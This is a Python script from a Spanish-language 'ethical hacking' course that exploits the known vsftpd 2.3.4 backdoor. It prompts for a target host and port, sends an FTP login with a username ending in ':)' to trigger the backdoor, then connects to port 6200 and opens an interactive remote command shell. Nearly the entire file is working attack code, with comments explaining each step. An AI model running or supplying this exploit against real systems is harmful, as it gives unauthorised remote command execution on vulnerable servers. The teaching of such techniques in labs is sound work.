#*********************************************************************************************************************************
#Curso "Python para hacking ético" Tknika 2022/2023
#RESUMEN DEL SCRIPT:
#Realizamos un ataque aprovechándonos de la vulnerabilidad del software VSFPTD 2.3.4 instalado en la víctima,
#que abre una puerta trasera en el puerto 6200 ella.
#*********************************************************************************************************************************

import socket
import time
import ipaddress


#Función que comprueba si un valor es una IP válida; si no lo es, comprueba si es un nombre de host válido. 
def validar_destino(direccion_destino):
    try:
        ipaddress.ip_address(direccion_destino)
        return True 
    except ValueError:
        try:
            socket.gethostbyname(direccion_destino)
            return True
        except socket.error:
            return False

#Función que comprueba si un valor es un puerto válido: está vacío (puerto por defecto) o está entre 1 y 65535
def validar_puerto(puerto):
    if puerto=="":
        return True
    else:
        try:
            puerto_destino = int(puerto)
            if 1 <= puerto_destino <= 65535:
                return True
            else:
                return False
        except ValueError:
            return False
        
#Función para solicitar al usuario que introduzca los datos que vamos a necesitar para conectarnos al servidor ssh: IP, puerto de destino, y usuario. 
def solicitar_datos_usuario():
    try:
        destino_correcto=False
        puerto_correcto=False
        puerto_activo=False
        while not puerto_activo:
            while not destino_correcto:
                destino = input('>> Introduce la dirección del host objetivo (IP o nombre de host): ')
                if validar_destino(destino):
                    destino_correcto=True
            while not puerto_correcto:
                puerto = input('>> Introduce el puerto objetivo, entre 1 y 65535 (déjalo en blanco para el valor predeterminado -21-): ')
                if validar_puerto(puerto):
                    puerto_correcto=True
                    if puerto == "":
                        puerto = 21
            #Comprobamos al menos si el puerto está abierto, ya que, si no, no merece la pena seguir adelante, por lo que pediremos de nuevo al usuario
            #que introduzca la IP y el puerto.
            try:
                with socket.create_connection((destino, puerto), timeout=5):
                    puerto_activo=True
            except (socket.error, socket.timeout):
                print (f"El puerto {puerto} de la dirección IP {destino} no está accesible")
                destino_correcto=False
                puerto_correcto=False
        return destino, puerto
  
    except ValueError:
        print ("Ha ocurrido un error inesperado...")
        
#Lanza vsftpd 2.3.4 backdoor
def lanzar_exploit(direccion, puerto_destino):
    try:
        print('[*] Intentando conectarnos al servidor FTP..')
        ftp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ftp_socket.connect((direccion, puerto_destino))

        # Intentamos loguearnos
        # El nombre de usuario tiene que acabar en ":). Elegimos "Tknika"
        # La contraseña puede ser cualquiera: Elegimos "password"
        ftp_socket.send(b'USER Tknika:)\n')
        ftp_socket.send(b'PASS password\n')
        time.sleep(2)
        ftp_socket.close()
        print('[+] Puerta trasera lanzada')

    except ValueError:
        print(f"Error. No se ha podido lanzar la puerta trasera")

    try:
        print("[*] Intentando conectarnos mediante la puerta trasera...Puerto 6200")
        #Generamos un socket TCP para la conexión mediante la puerta trasera
        puerta_trasera_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #Efectuamos la conexión con la dirección que nos han pasado y mediante el puerto 6200,
        #que es en el que el software tiene abierta una puerta trasera
        puerta_trasera_socket.connect((direccion, 6200))
        print(f"[+] Conectado a puerta trasera en la IP {direccion}")
        ejecuta_exit=False
        #Mientras el comando introducido no sea exit, el shell queda abierto, pudiéndose enviar
        #comandos y recibiendo sus respuestas
        while not ejecuta_exit:
            #Leemos el comando introducido por pantalla
            comando=input ("$ ")
            if comando.lower()=="exit":
                ejecuta_exit=True
            else:
                #Enviamos el comando mediante el socket e imprimimos la respuesta que devuelva
                comando = str.encode(comando + '\n')
                puerta_trasera_socket.send(comando)
                respuesta = puerta_trasera_socket.recv(4096).decode('utf-8')
                print(f" Respuesta: {respuesta}")
        #Cerramos el socket.     
        puerta_trasera_socket.close()

    except ValueError:
        print("No se ha podido efectuar la conexión mediante la puerta trasera")


if __name__ == '__main__':
    try:
        #Solicitamos los datos al usuario, y lanzamos el exploit con ellos
        destino,puerto=solicitar_datos_usuario()
        lanzar_exploit(destino,puerto)
    except ValueError:
        print ("Error inesperado")
